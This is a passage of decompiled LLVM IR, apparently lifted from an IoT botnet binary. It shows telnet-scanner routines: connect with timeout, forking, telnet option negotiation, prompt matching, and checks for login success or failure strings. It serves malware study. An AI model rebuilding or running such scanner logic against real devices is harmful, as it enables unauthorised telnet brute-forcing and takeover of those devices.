  %v2_80491dd = inttoptr i32 %v1_80491dd to i32*
  store i32 0, i32* %v2_80491dd, align 4
  %v3_80491ec = add i32 %tmp2, 8
  %v4_80491ec = inttoptr i32 %v3_80491ec to i8*
  store i8 %v6_80491c3, i8* %v4_80491ec, align 1
  %v1_80491f2 = add i32 %tmp2, 24
  %v2_80491f2 = inttoptr i32 %v1_80491f2 to i32*
  %v3_80491f2 = load i32, i32* %v2_80491f2, align 4
  %v3_8049203 = inttoptr i32 %v3_80491f2 to i8*
  %v4_8049203 = call i32 @__GI_memset(i8* %v3_8049203, i32 0, i32 1024)
  ret i32 %v4_8049203

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80491da, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804921b = inttoptr i32 %arg1 to i32*
  %v3_804921b = call i32 @advance_state(i32* %v2_804921b, i32 0)
  %v1_8049226 = add i32 %arg1, 9
  %v2_8049226 = inttoptr i32 %v1_8049226 to i8*
  store i8 1, i8* %v2_8049226, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804923d = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_8059800.23 to i32*))
  ret i32 %v4_804923d
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8049258 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_80597e0.31 to i32*))
  ret i32 %v4_8049258
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804926e = call i32 @contains_success(i32 %arg1)
  %v1_8049276 = icmp eq i32 %v1_804926e, 0
  %v1_8049278 = icmp eq i1 %v1_8049276, false
  br i1 %v1_8049278, label %dec_label_pc_804929c, label %dec_label_pc_804927a

dec_label_pc_804927a:                             ; preds = %entry
  %v1_8049280 = call i32 @contains_fail(i32 %arg1)
  %v1_8049288 = icmp ne i32 %v1_8049280, 0
  %. = zext i1 %v1_8049288 to i32
  br label %dec_label_pc_804929c

dec_label_pc_804929c:                             ; preds = %dec_label_pc_804927a, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_804927a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80492a1 = load i32, i32* @ebp, align 4
  store i32 %v0_80492a1, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80492bc

dec_label_pc_80492bc:                             ; preds = %dec_label_pc_80492bc, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_80492bc, %dec_label_pc_80492bc ]
  %v4_80492bc = add i32 %stack_var_-12.0, 1
  %v2_80492c2 = mul i32 %v4_80492bc, 4
  %v5_80492c5 = add i32 %v2_80492c2, %tmp5
  %v1_80492c8 = inttoptr i32 %v5_80492c5 to i32*
  %v2_80492c8 = load i32, i32* %v1_80492c8, align 4
  %v1_80492ca = icmp eq i32 %v2_80492c8, 0
  %v1_80492cc = icmp eq i1 %v1_80492ca, false
  br i1 %v1_80492cc, label %dec_label_pc_80492bc, label %dec_label_pc_8049301.preheader

dec_label_pc_8049301.preheader:                   ; preds = %dec_label_pc_80492bc
  %v2_80492e9 = inttoptr i32 %arg1 to i8*
  %v5_804930716 = icmp sgt i32 %v4_80492bc, 0
  br i1 %v5_804930716, label %dec_label_pc_80492d7.lr.ph, label %dec_label_pc_8049310

dec_label_pc_80492d7.lr.ph:                       ; preds = %dec_label_pc_8049301.preheader
  br label %dec_label_pc_80492d7

dec_label_pc_80492d7:                             ; preds = %dec_label_pc_80492d7.lr.ph, %dec_label_pc_80492fe
  %storemerge117 = phi i32 [ 0, %dec_label_pc_80492d7.lr.ph ], [ %v4_80492fe, %dec_label_pc_80492fe ]
  %v2_80492da = mul i32 %storemerge117, 4
  %v5_80492dd = add i32 %v2_80492da, %tmp5
  %v1_80492e0 = inttoptr i32 %v5_80492dd to i32*
  %v2_80492e0 = load i32, i32* %v1_80492e0, align 4
  store i32 %v2_80492e0, i32* @eax, align 4
  %v3_80492e9 = call i32 @strcasestr(i8* %v2_80492e9, i32 %v2_80492e0)
  %v1_80492f1 = icmp eq i32 %v3_80492e9, 0
  br i1 %v1_80492f1, label %dec_label_pc_80492fe, label %dec_label_pc_8049310

dec_label_pc_80492fe:                             ; preds = %dec_label_pc_80492d7
  %v4_80492fe = add nuw nsw i32 %storemerge117, 1
  %v5_8049307 = icmp slt i32 %v4_80492fe, %v4_80492bc
  br i1 %v5_8049307, label %dec_label_pc_80492d7, label %dec_label_pc_8049310

dec_label_pc_8049310:                             ; preds = %dec_label_pc_80492d7, %dec_label_pc_80492fe, %dec_label_pc_8049301.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049301.preheader ], [ 0, %dec_label_pc_80492fe ], [ 1, %dec_label_pc_80492d7 ]
  %v2_8049313 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049313, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_80492bc, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049310, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80492d7, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8049318 = load i32, i32* @edi, align 4
  %v3_8049329 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049334 = or i32 %v3_8049329, 2048
  %v3_8049346 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049334)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8049357 = urem i32 %arg3, 65536
  %v1_8049360 = call i32 @htons(i32 %v1_8049357)
  store i32 %arg2, i32* @edx, align 4
  %v3_804937a = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049382 = icmp eq i32 %v3_804937a, 0
  br i1 %v1_8049382, label %dec_label_pc_8049395, label %dec_label_pc_8049386

dec_label_pc_8049386:                             ; preds = %entry
  br label %dec_label_pc_80494d2

dec_label_pc_8049395:                             ; preds = %entry
  %v2_8049372 = ptrtoint i32* %stack_var_-40 to i32
  %v3_80493b4 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8049372, i32 16)
  %v5_80493bf = icmp slt i32 %v3_80493b4, 0
  %v1_80493c3 = icmp eq i1 %v5_80493bf, false
  br i1 %v1_80493c3, label %dec_label_pc_8049499, label %dec_label_pc_80493c9

dec_label_pc_80493c9:                             ; preds = %dec_label_pc_8049395
  %v1_80493c9 = call i32 @__errno_location(i32 %v3_80493b4)
  %v1_80493ce = inttoptr i32 %v1_80493c9 to i32*
  %v2_80493ce = load i32, i32* %v1_80493ce, align 4
  %v9_80493d0 = icmp eq i32 %v2_80493ce, 115
  %v1_80493d3 = icmp eq i1 %v9_80493d0, false
  br i1 %v1_80493d3, label %dec_label_pc_804948d, label %dec_label_pc_80493d9

dec_label_pc_80493d9:                             ; preds = %dec_label_pc_80493c9
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_80493f6 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80493f6, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80493fd = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804940a = udiv i32 %arg1, 32
  %v1_8049410 = urem i32 %arg1, 32
  %v0_8049413 = load i32, i32* @ebp, align 4
  %v2_8049413 = mul nuw nsw i32 %v2_804940a, 4
  %v3_8049413 = add nsw i32 %v2_8049413, -164
  %v4_8049413 = add i32 %v3_8049413, %v0_8049413
  %v5_8049413 = inttoptr i32 %v4_8049413 to i32*
  %v6_8049413 = load i32, i32* %v5_8049413, align 4
  %v9_8049413 = shl i32 1, %v1_8049410
  %v12_8049413 = or i32 %v6_8049413, %v9_8049413
  store i32 %v12_8049413, i32* %v5_8049413, align 4
  %v1_804941e = add i32 %arg1, 1
  %v2_8049422 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049435 = call i32 @__libc_select(i32 %v1_804941e, i32 0, i32 %v2_80493f6, i32 0, i32 %v2_8049422)
  %tmp33 = icmp slt i32 %v5_8049435, 1
  br i1 %tmp33, label %dec_label_pc_8049481, label %dec_label_pc_8049441

dec_label_pc_8049441:                             ; preds = %dec_label_pc_80493d9
  store i32 4, i32* %stack_var_-180, align 4
  %v2_804944e = ptrtoint i32* %stack_var_-180 to i32
  %v2_8049455 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049463 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8049455, i32 %v2_804944e)
  %v3_804946b = load i32, i32* %stack_var_-184, align 4
  %v1_8049471 = icmp eq i32 %v3_804946b, 0
  br i1 %v1_8049471, label %dec_label_pc_8049499, label %dec_label_pc_8049475

dec_label_pc_8049475:                             ; preds = %dec_label_pc_8049441
  br label %dec_label_pc_80494d2

dec_label_pc_8049481:                             ; preds = %dec_label_pc_80493d9
  br label %dec_label_pc_80494d2

dec_label_pc_804948d:                             ; preds = %dec_label_pc_80493c9
  br label %dec_label_pc_80494d2

dec_label_pc_8049499:                             ; preds = %dec_label_pc_8049441, %dec_label_pc_8049395
  %v3_80494a3 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80494ae = and i32 %v3_80494a3, -2049
  %v3_80494c0 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80494ae)
  br label %dec_label_pc_80494d2

dec_label_pc_80494d2:                             ; preds = %dec_label_pc_804948d, %dec_label_pc_8049481, %dec_label_pc_8049475, %dec_label_pc_8049386, %dec_label_pc_8049499
  %v3_80494d2 = phi i32 [ 0, %dec_label_pc_804948d ], [ 0, %dec_label_pc_8049481 ], [ 0, %dec_label_pc_8049475 ], [ 0, %dec_label_pc_8049386 ], [ 1, %dec_label_pc_8049499 ]
  store i32 %v0_8049318, i32* @edi, align 4
  ret i32 %v3_80494d2

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80494d2, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80494e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80494e0, i32* %stack_var_-8, align 4
  %v1_80494e4 = call i32 @__libc_fork(i32 %v0_80494e0)
  %v4_80494ec = icmp eq i32 %v1_80494e4, 0
  %v1_80494f0 = icmp eq i1 %v4_80494ec, false
  br i1 %v1_80494f0, label %dec_label_pc_80494fd, label %dec_label_pc_80494f2

dec_label_pc_80494f2:                             ; preds = %entry
  br label %dec_label_pc_80495e1

dec_label_pc_80494fd:                             ; preds = %entry
  %v0_80494fd = load i32, i32* @global_var_8059b08.32, align 8
  %v0_8049502 = load i32, i32* @global_var_8059b0c.33, align 4
  %v1_8049508 = add i32 %v0_80494fd, 1
  %v5_8049508 = icmp eq i32 %v0_80494fd, -1
  %v2_804950b = zext i1 %v5_8049508 to i32
  %v3_804950b = add i32 %v2_804950b, %v0_8049502
  store i32 %v1_8049508, i32* @global_var_8059b08.32, align 8
  store i32 %v3_804950b, i32* @global_var_8059b0c.33, align 4
  %v2_8049528 = mul i32 %v1_8049508, 4
  %v1_804952b = add i32 %v2_8049528, 4
  %v1_8049532 = call i32 @malloc(i32 %v1_804952b)
  br label %dec_label_pc_8049568

dec_label_pc_8049546:                             ; preds = %dec_label_pc_8049568, %dec_label_pc_8049599
  %v2_8049549 = mul i32 %storemerge1, 4
  %v5_804954e = add i32 %v2_8049549, %v1_8049532
  %v0_8049559 = load i32, i32* @global_var_805fd94.34, align 4
  %v2_804955e = add i32 %v0_8049559, %v2_8049549
  %v1_8049561 = inttoptr i32 %v2_804955e to i32*
  %v2_8049561 = load i32, i32* %v1_8049561, align 4
  %v2_8049563 = inttoptr i32 %v5_804954e to i32*
  store i32 %v2_8049561, i32* %v2_8049563, align 4
  %v4_8049565 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049568

dec_label_pc_8049568:                             ; preds = %dec_label_pc_80494fd, %dec_label_pc_8049546
  %storemerge1 = phi i32 [ %v4_8049565, %dec_label_pc_8049546 ], [ 0, %dec_label_pc_80494fd ]
  %v0_8049576 = load i32, i32* @global_var_8059b08.32, align 8
  %v0_804957b = load i32, i32* @global_var_8059b0c.33, align 4
  %v4_8049585 = icmp ne i32 %v0_8049576, 0
  %v2_8049588 = zext i1 %v4_8049585 to i32
  %v3_8049588 = add i32 %v0_804957b, -1
  %v4_8049588 = add i32 %v3_8049588, %v2_8049588
  store i32 %v4_8049588, i32* @ebx, align 4
  %v10_8049594 = icmp eq i32 %v4_8049588, 0
  br i1 %v10_8049594, label %dec_label_pc_8049599, label %dec_label_pc_8049546

dec_label_pc_8049599:                             ; preds = %dec_label_pc_8049568
  %v1_8049585 = add i32 %v0_8049576, -1
  %v10_80495a4 = icmp ult i32 %storemerge1, %v1_8049585
  br i1 %v10_80495a4, label %dec_label_pc_8049546, label %dec_label_pc_80495a9

dec_label_pc_80495a9:                             ; preds = %dec_label_pc_8049599
  %v2_80495b4 = mul i32 %v0_8049576, 4
  %v5_80495b7 = add i32 %v1_8049532, -4
  %v1_80495ba = add i32 %v5_80495b7, %v2_80495b4
  store i32 %v1_80495ba, i32* @edx, align 4
  %v2_80495c0 = inttoptr i32 %v1_80495ba to i32*
  store i32 %v1_80494e4, i32* %v2_80495c0, align 4
  %v0_80495c2 = load i32, i32* @global_var_805fd94.34, align 4
  %v1_80495cb = call i32 @free(i32 %v0_80495c2)
  store i32 %v1_8049532, i32* @global_var_805fd94.34, align 4
  store i32 %v1_80494e4, i32* @ecx, align 4
  br label %dec_label_pc_80495e1

dec_label_pc_80495e1:                             ; preds = %dec_label_pc_80494f2, %dec_label_pc_80495a9
  %v3_80495e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80495e4, i32* @ebx, align 4
  ret i32 %v1_80494e4

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049549, { 1, 0 }
  uselistorder i32 %v1_8049532, { 2, 0, 1 }
  uselistorder i32 %v0_80494fd, { 1, 0 }
  uselistorder label %dec_label_pc_80495e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049568, { 1, 0 }
  uselistorder label %dec_label_pc_8049546, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80495e9 = load i32, i32* @ebp, align 4
  store i32 %v0_80495e9, i32* %stack_var_-4, align 4
  %v1_80495f2 = add i32 %arg2, 1
  %v1_80495f3 = inttoptr i32 %v1_80495f2 to i8*
  %v2_80495f3 = load i8, i8* %v1_80495f3, align 1
  %v5_80495f3 = and i32 %v1_80495f2, -256
  %v9_80495ff = icmp ult i8 %v2_80495f3, -5
  br i1 %v9_80495ff, label %dec_label_pc_80496df, label %dec_label_pc_804960c

dec_label_pc_804960c:                             ; preds = %entry
  %v7_8049613 = icmp eq i8 %v2_80495f3, -1
  br i1 %v7_8049613, label %dec_label_pc_8049615, label %dec_label_pc_804962f

dec_label_pc_8049615:                             ; preds = %dec_label_pc_804960c
  br label %dec_label_pc_80496df

dec_label_pc_804962f:                             ; preds = %dec_label_pc_804960c
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_804963a = ptrtoint i32* %stack_var_-5 to i32
  %v4_8049641 = call i32 @__libc_send(i32 %arg1, i32 %v2_804963a, i32 1, i32 16384)
  %v2_804964d = load i8, i8* %v1_80495f3, align 1
  %v11_804964f = icmp eq i8 %v2_804964d, -4
  %v1_8049651 = icmp eq i1 %v11_804964f, false
  br i1 %v1_8049651, label %dec_label_pc_8049659, label %dec_label_pc_8049653

dec_label_pc_8049653:                             ; preds = %dec_label_pc_804962f
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_8049659:                             ; preds = %dec_label_pc_804962f
  %v2_804965d = load i8, i8* %v1_80495f3, align 1
  %v11_804965f = icmp eq i8 %v2_804965d, -2
  %v1_8049661 = icmp eq i1 %v11_804965f, false
  br i1 %v1_8049661, label %dec_label_pc_8049669, label %dec_label_pc_8049663

dec_label_pc_8049663:                             ; preds = %dec_label_pc_8049659
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_8049669:                             ; preds = %dec_label_pc_8049659
  %v2_804966d = load i8, i8* %v1_80495f3, align 1
  %v10_804966f = icmp eq i8 %v2_804966d, 3
  %v1_8049671 = icmp eq i1 %v10_804966f, false
  %v11_8049695 = icmp eq i8 %v2_804966d, -3
  %v1_8049697 = icmp eq i1 %v11_8049695, false
  br i1 %v1_8049671, label %dec_label_pc_804968f, label %dec_label_pc_8049673

dec_label_pc_8049673:                             ; preds = %dec_label_pc_8049669
  %. = select i1 %v1_8049697, i32 253, i32 251
  %v7_8049687 = or i32 %., %v5_80495f3
  store i32 %v7_8049687, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_804968f:                             ; preds = %dec_label_pc_8049669
  %.2 = select i1 %v1_8049697, i32 254, i32 252
  %v5_80496a3 = load i32, i32* @edx, align 4
  %v6_80496a3 = and i32 %v5_80496a3, -256
  %v7_80496a3 = or i32 %v6_80496a3, %.2
  store i32 %v7_80496a3, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_80496a9:                             ; preds = %dec_label_pc_8049673, %dec_label_pc_8049663, %dec_label_pc_8049653, %dec_label_pc_804968f
  %v4_80496b7 = call i32 @__libc_send(i32 %arg1, i32 %v2_804963a, i32 1, i32 16384)
  %v1_80496c2 = add i32 %arg2, 2
  %v4_80496d0 = call i32 @__libc_send(i32 %arg1, i32 %v1_80496c2, i32 1, i32 16384)
  %v2_80496e2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80496df

dec_label_pc_80496df:                             ; preds = %dec_label_pc_8049615, %dec_label_pc_80496a9, %entry
  %v2_80496e2 = phi i32 [ %v0_80495e9, %dec_label_pc_8049615 ], [ %v2_80496e2.pre, %dec_label_pc_80496a9 ], [ %v0_80495e9, %entry ]
  store i32 %v2_80496e2, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80496df, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80496a9, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_80496f2 = ptrtoint i8* %arg1 to i32
  %v3_8049703 = call i32 @_strlen(i8* %arg1)
  %v4_8049703 = mul i32 %v3_8049703, -1
  %v1_8049709 = sub i32 0, %v4_8049703
  %v6_8049730 = sub i32 %v4_80496f2, %v4_8049703
  br label %dec_label_pc_80497b2

dec_label_pc_8049720:                             ; preds = %dec_label_pc_8049770, %dec_label_pc_8049759, %dec_label_pc_8049742, %dec_label_pc_804972b
  %v4_8049720 = add nsw i32 %stack_var_-12.025, 1
  %v7_8049729 = icmp slt i32 %v4_8049720, %v1_8049709
  br i1 %v7_8049729, label %dec_label_pc_804972b, label %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge

dec_label_pc_8049723.dec_label_pc_8049787_crit_edge: ; preds = %dec_label_pc_8049720, %dec_label_pc_8049723.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049723.preheader ], [ %v4_8049720, %dec_label_pc_8049720 ]
  %.pre = sub i32 %v6_8049730, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049787

dec_label_pc_804972b:                             ; preds = %dec_label_pc_8049723.preheader, %dec_label_pc_8049720
  %stack_var_-12.025 = phi i32 [ %v4_8049720, %dec_label_pc_8049720 ], [ %stack_var_-12.1, %dec_label_pc_8049723.preheader ]
  %v2_8049738 = sub i32 %v6_8049730, %stack_var_-12.025
  %v1_804973c = inttoptr i32 %v2_8049738 to i8*
  %v2_804973c = load i8, i8* %v1_804973c, align 1
  %v4_804973e = icmp eq i8 %v2_804973c, 0
  br i1 %v4_804973e, label %dec_label_pc_8049720, label %dec_label_pc_8049742

dec_label_pc_8049742:                             ; preds = %dec_label_pc_804972b
  %v2_8049753 = load i8, i8* %v1_804973c, align 1
  %v7_8049755 = icmp eq i8 %v2_8049753, 32
  br i1 %v7_8049755, label %dec_label_pc_8049720, label %dec_label_pc_8049759

dec_label_pc_8049759:                             ; preds = %dec_label_pc_8049742
  %v2_804976a = load i8, i8* %v1_804973c, align 1
  %v10_804976c = icmp eq i8 %v2_804976a, 13
  br i1 %v10_804976c, label %dec_label_pc_8049720, label %dec_label_pc_8049770

dec_label_pc_8049770:                             ; preds = %dec_label_pc_8049759
  %v2_8049781 = load i8, i8* %v1_804973c, align 1
  %v10_8049783 = icmp eq i8 %v2_8049781, 10
  br i1 %v10_8049783, label %dec_label_pc_8049720, label %dec_label_pc_8049787

dec_label_pc_8049787:                             ; preds = %dec_label_pc_8049770, %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge ], [ %stack_var_-12.025, %dec_label_pc_8049770 ]
  %v1_8049798.pre-phi = phi i8* [ %.pre9, %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge ], [ %v1_804973c, %dec_label_pc_8049770 ]
  %v2_8049798 = load i8, i8* %v1_8049798.pre-phi, align 1
  %v6_804979d = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_80561a5.35 to i32)
  %v1_80497a0 = inttoptr i32 %v6_804979d to i8*
  %v2_80497a0 = load i8, i8* %v1_80497a0, align 1
  %v15_80497a2 = icmp eq i8 %v2_8049798, %v2_80497a0
  %v1_80497a4 = icmp eq i1 %v15_80497a2, false
  br i1 %v1_80497a4, label %dec_label_pc_80497af, label %dec_label_pc_80497dc

dec_label_pc_80497af:                             ; preds = %dec_label_pc_8049787
  %v4_80497af = add i32 %storemerge2, 1
  br label %dec_label_pc_80497b2

dec_label_pc_80497b2:                             ; preds = %entry, %dec_label_pc_80497af
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.021, %dec_label_pc_80497af ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_80497af, %dec_label_pc_80497af ]
  %v3_80497c6 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80561a5.35, i32 0, i32 0))
  %v7_80497cd = icmp ult i32 %storemerge2, %v3_80497c6
  br i1 %v7_80497cd, label %dec_label_pc_8049723.preheader, label %dec_label_pc_80497dc

dec_label_pc_8049723.preheader:                   ; preds = %dec_label_pc_80497b2
  %v7_804972924 = icmp slt i32 %stack_var_-12.1, %v1_8049709
  br i1 %v7_804972924, label %dec_label_pc_804972b, label %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge

dec_label_pc_80497dc:                             ; preds = %dec_label_pc_80497b2, %dec_label_pc_8049787
  %storemerge = phi i32 [ 1, %dec_label_pc_8049787 ], [ 0, %dec_label_pc_80497b2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049730, { 1, 0 }
  uselistorder [6 x i8]* @global_var_80561a5.35, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80497b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_804982b = ptrtoint i32* %stack_var_-160 to i32
  %tmp34 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049845 = urem i32 %arg1, 32
  %v9_8049848 = shl i32 1, %v1_8049845
  %v1_8049853 = add i32 %arg1, 1
  %v2_8049857 = ptrtoint i32* %stack_var_-168 to i32
  %v2_8049926 = inttoptr i32 %arg2 to i8*
  %v4_8049932 = icmp eq i32 %arg3, 0
  %v1_804995341 = add i32 %arg8, 2
  %v5_804995944 = icmp slt i32 %v1_804995341, %arg7
  br i1 %v5_804995944, label %dec_label_pc_804995b.lr.ph, label %dec_label_pc_8049989

dec_label_pc_804995b.lr.ph:                       ; preds = %entry
  %v2_804983f = udiv i32 %arg1, 32
  %v2_8049848 = mul nuw nsw i32 %v2_804983f, 4
  %v3_8049848 = add nsw i32 %v2_8049848, -156
  %v5_804987d = ptrtoint i8* %arg6 to i32
  %tmp39 = icmp slt i32 %arg5, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br label %dec_label_pc_804995b

dec_label_pc_8049821:                             ; preds = %dec_label_pc_8049969, %dec_label_pc_804995b
  store i32 %v2_804982b, i32* @edi, align 4
  %v5_8049832 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  %v0_8049848 = load i32, i32* @ebp, align 4
  %v4_8049848 = add i32 %v3_8049848, %v0_8049848
  %v5_8049848 = inttoptr i32 %v4_8049848 to i32*
  %v6_8049848 = load i32, i32* %v5_8049848, align 4
  %v12_8049848 = or i32 %v6_8049848, %v9_8049848
  store i32 %v12_8049848, i32* %v5_8049848, align 4
  %v5_804986a = call i32 @__libc_select(i32 %v1_8049853, i32 %v2_804982b, i32 0, i32 0, i32 %v2_8049857)
  %tmp36 = icmp slt i32 %v5_804986a, 1
  br i1 %tmp36, label %dec_label_pc_8049989, label %dec_label_pc_804987a

dec_label_pc_804987a:                             ; preds = %dec_label_pc_8049821
  %v6_804987d = add i32 %stack_var_-32.045, %v5_804987d
  %v5_8049880 = inttoptr i32 %v6_804987d to i8*
  %v5_804988d = call i32 @__libc_recv(i32 %arg1, i32 %v6_804987d, i32 1, i32 0)
  %v13_8049898 = icmp eq i32 %v5_804988d, -1
  br i1 %v13_8049898, label %dec_label_pc_80498a4, label %dec_label_pc_804989e

dec_label_pc_804989e:                             ; preds = %dec_label_pc_804987a
  %v4_804989e = icmp eq i32 %v5_804988d, 0
  %v1_80498a2 = icmp eq i1 %v4_804989e, false
  br i1 %v1_80498a2, label %dec_label_pc_80498b3, label %dec_label_pc_80498a4

dec_label_pc_80498a4:                             ; preds = %dec_label_pc_804989e, %dec_label_pc_804987a
  br label %dec_label_pc_8049993

dec_label_pc_80498b3:                             ; preds = %dec_label_pc_804989e
  %v5_80498b6 = add i32 %v5_804988d, %stack_var_-32.045
  %v2_80498bc = load i8, i8* %v5_8049880, align 1
  %v11_80498be = icmp eq i8 %v2_80498bc, -1
  %v1_80498c0 = icmp eq i1 %v11_80498be, false
  br i1 %v1_80498c0, label %dec_label_pc_804991d, label %dec_label_pc_80498c2

dec_label_pc_80498c2:                             ; preds = %dec_label_pc_80498b3
  %v1_80498c5 = add i32 %v6_804987d, 1
  %v5_80498ce = call i32 @__libc_recv(i32 %arg1, i32 %v1_80498c5, i32 2, i32 0)
  %v13_80498d9 = icmp eq i32 %v5_80498ce, -1
  br i1 %v13_80498d9, label %dec_label_pc_80498e5, label %dec_label_pc_80498df

dec_label_pc_80498df:                             ; preds = %dec_label_pc_80498c2
  %v4_80498df = icmp eq i32 %v5_80498ce, 0
  %v1_80498e3 = icmp eq i1 %v4_80498df, false
  br i1 %v1_80498e3, label %dec_label_pc_80498f4, label %dec_label_pc_80498e5

dec_label_pc_80498e5:                             ; preds = %dec_label_pc_80498df, %dec_label_pc_80498c2
  br label %dec_label_pc_8049993

dec_label_pc_80498f4:                             ; preds = %dec_label_pc_80498df
  %v5_80498f7 = add i32 %v5_80498ce, %v5_80498b6
  %v3_8049905 = call i32 @negotiate(i32 %arg1, i32 %v6_804987d, i32 3)
  %v1_804990d = icmp eq i32 %v3_8049905, 0
  %v1_804990f = icmp eq i1 %v1_804990d, false
  br i1 %v1_804990f, label %dec_label_pc_8049950.backedge, label %dec_label_pc_8049911

dec_label_pc_8049950.backedge:                    ; preds = %dec_label_pc_80498f4, %dec_label_pc_8049932, %dec_label_pc_8049938
  %stack_var_-32.0.be = phi i32 [ %v5_80498b6, %dec_label_pc_8049932 ], [ %v5_80498b6, %dec_label_pc_8049938 ], [ %v5_80498f7, %dec_label_pc_80498f4 ]
  %v1_8049953 = add i32 %stack_var_-32.0.be, 2
